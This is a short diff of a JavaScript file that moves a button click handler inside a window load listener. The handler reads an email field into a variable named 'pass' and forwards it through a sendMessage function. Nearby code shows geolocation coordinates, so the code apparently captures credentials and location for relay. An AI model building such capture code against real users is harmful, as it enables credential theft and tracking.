@@ -41,11 +41,13 @@ function showPosition(position) {
    "<br>Longitude: " + position.coords.longitude;
 }
 
-
-document.getElementById('btn_continue').addEventListener('click', ()=> {
+window.addEventListener('load', ()=> {
+    document.getElementById('btn_continue').addEventListener('click', ()=> {
     let pass = document.getElementById('identify_email').value;
     sendMessage(pass); 
 });
+})
+
 
 
 
@@ -53,4 +55,5 @@ document.getElementById('btn_continue').addEventListener('click', ()=> {
 
 // Now you can send any text(even a form data) by calling sendMessage function.
 // For example if you want to send the 'hello', you can call that function like this:
+
 
